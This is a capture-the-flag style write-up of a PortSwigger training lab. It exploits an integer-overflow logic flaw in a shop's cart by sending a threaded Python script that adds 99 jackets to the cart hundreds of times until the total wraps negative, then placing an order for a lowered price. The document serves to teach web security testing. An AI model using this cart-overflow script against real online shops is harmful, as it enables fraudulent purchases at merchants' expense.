# Low-level logic flaw

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level), you'll learn: Low-level logic flaw! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter`

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220024954.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025012.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025020.png)

**Let's try to buy the leather jacket!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025136.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025203.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025238.png)

When we clicked the `Add to cart` button, **it'll send a POST request to `/cart`, with parameter `productId=1`, `redir=PRODUCT` and `quantity=1`.**

**Let's forward that request and check out the `/cart` page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220025807.png)

We can see that the leather jacket has been added to our cart.

**Now, what if we send the `quantity` value to a negative value? Like `-2`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220030536.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220030545.png)

Hmm... It doesn't have a negative quantity of products.

**In the `Add to cart` button's HTML form, we can see that the `quantity` has a maximum number:**
```html
<form id=addToCartForm action=/cart method=POST>
	<input required type=hidden name=productId value=1>
	<input required type=hidden name=redir value=PRODUCT>
	<input required type=number min=0 max=99 name=quantity value=1>
	<button type=submit class=button>Add to cart</button>
</form>
```

As you can, the minimum number is `0`, and the maximum is `99`.

**What if I go over 99?**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220031258.png)

Hmm... `Invalid parameter`.

**Now, what if the total price is greater than a maximum value of an integer?** (Integer overflow)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220031617.png)

**If the total price is greater than `2147483647`, will the price went to `0`?**

**To do so, I'll keep buying 99 leather jackets in a python script:**
```py
#!/usr/bin/env python3

import requests
import re
from threading import Thread
from time import sleep

def sendAndGetRequest(url, cookie, data):
    # Send a POST request to /cart, which buying 99 quantity of the leather jacket
    requests.post(url, cookies=cookie, data=data)

    # Send a GET request to /cart, which fetches all the text in that page
    requestGetText = requests.get(url, cookies=cookie).text

    # Try to find the total price
    try:
        # Find pattern $1234.00 or -$1234.00
        matchedTotalPrice = re.findall(r'(\-?\$[0-9]+\.[0-9]{2})', requestGetText)
        print(f'[*] Total price = {matchedTotalPrice[2]}')
    # If couldn't find the total price, display the total price to $1337.00
    except IndexError:
        print('[*] Total price = $1337.00')

def main():
    url = 'https://0aff007003e8750ec056ea21007000ed.web-security-academy.net/cart'
    cookie = {'session': 'EFLAO76m0lWVnRY8CykNMObFTksFmX9B'}
    data = {
        'productId': '1',
        'redir': 'PRODUCT',
        'quantity': 99
    }

    # Create 350 jobs
    for job in range(350):
        # Create each thread to run function sendAndGetRequest(url, cookie, data)
        thread = Thread(target=sendAndGetRequest, args=(url, cookie, data))
        # Start the thread
        thread.start()
        # Sleep 0.2s to prevent max retries exceeded with url error
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5]
└─# python3 exploit.py
[*] Total price = $1323630.00
[...]
[*] Total price = $21310443.00
[*] Total price = -$21374503.96
[...]
[*] Total price = -$64060.96
[*] Total price = $200665.04
[...]
[*] Total price = $1127206.04
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220040907.png)

**As you can see, when the total price reached greater than `2147483647`, the value will become negative, then it'll go back to positive again!**

**Now, let's decrease the quantity of the leather jacket, so that the total price will become affordable for us:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220041158.png)

**Hmm... Still greater than $100. Let's `-1` the quantity again, and buy other products:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220041433.png)

**Let's go with `Sprout More Brain Power`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220041500.png)

**Let's buy `528` that product: (`2.32 * 528 = 1224.96`)**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220041819.png)

**Nice! Now we can buy those products! Let's click the `Place order` button:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Business-Logic-Vulnerabilities/BLV-5/images/Pasted%20image%2020221220041855.png)

We did it!

# What we've learned:

1. Low-level logic flaw